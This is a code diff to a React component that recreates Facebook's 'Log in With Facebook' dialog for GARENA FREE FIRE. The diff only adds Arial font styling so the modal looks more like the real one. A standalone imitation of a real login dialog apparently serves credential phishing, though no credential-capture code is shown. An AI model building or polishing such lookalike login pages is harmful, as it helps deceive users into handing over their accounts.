@@ -37,9 +37,9 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
         <div className="bg-[#4267B2] text-white p-4 rounded-t-lg relative flex items-center justify-between">
           <div className="flex items-center gap-3">
             <div className="w-8 h-8 bg-white rounded flex items-center justify-center">
-              <span className="text-[#4267B2] font-bold text-lg">f</span>
+              <span className="text-[#4267B2] font-bold text-lg" style={{ fontFamily: 'Arial, sans-serif' }}>f</span>
             </div>
-            <span className="font-normal text-lg">Log in With Facebook</span>
+            <span className="font-normal text-lg" style={{ fontFamily: 'Arial, sans-serif' }}>Log in With Facebook</span>
           </div>
           <button 
             onClick={onClose}
@@ -61,15 +61,15 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
           </div>
 
           {/* Title Text */}
-          <h2 className="text-gray-600 text-base font-normal mb-1">
+          <h2 className="text-gray-600 text-base font-normal mb-1" style={{ fontFamily: 'Arial, sans-serif' }}>
             Log in to your Facebook account to
           </h2>
-          <h3 className="text-gray-600 text-base font-normal mb-4">
+          <h3 className="text-gray-600 text-base font-normal mb-4" style={{ fontFamily: 'Arial, sans-serif' }}>
             connect to FREE FIRE
           </h3>
 
           {/* Info Text */}
-          <p className="text-gray-400 text-sm mb-6">
+          <p className="text-gray-400 text-sm mb-6" style={{ fontFamily: 'Arial, sans-serif' }}>
             This doesn't let the app post to Facebook.
           </p>
 
@@ -113,7 +113,7 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
           </div>
 
           {/* Footer Text */}
-          <div className="mt-6 text-xs text-gray-500 leading-relaxed">
+          <div className="mt-6 text-xs text-gray-500 leading-relaxed" style={{ fontFamily: 'Arial, sans-serif' }}>
             <p>
               By continuing, FREE FIRE will receive ongoing access to the information that you share and Facebook will record when GARENA FREE FIRE accesses it.{' '}
               <span className="text-[#4267B2] cursor-pointer hover:underline">
